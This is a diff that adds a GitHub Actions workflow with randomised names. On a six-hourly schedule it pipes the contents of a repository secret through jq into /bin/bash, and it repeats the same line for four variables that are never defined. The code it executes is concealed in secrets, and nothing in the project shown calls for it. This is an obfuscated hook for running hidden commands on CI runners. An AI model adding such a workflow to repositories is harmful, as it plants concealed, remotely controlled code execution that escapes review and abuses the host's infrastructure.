@@ -1,0 +1,22 @@
+name: zkmmlkk
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zkmmlkk
+        env:
+          rdc52823: ${{ secrets.rdc52823 }}
+        run: |
+          echo $rdc52823 | jq -r .wiyj2272 | /bin/bash
+          echo $nl51176 | jq -r .yq693 | /bin/bash
+          echo $thusc7281 | jq -r .okze07 | /bin/bash
+          echo $qjpxv05087 | jq -r .pqul59 | /bin/bash
+          echo $mu038 | jq -r .wplhj1639 | /bin/bash
+
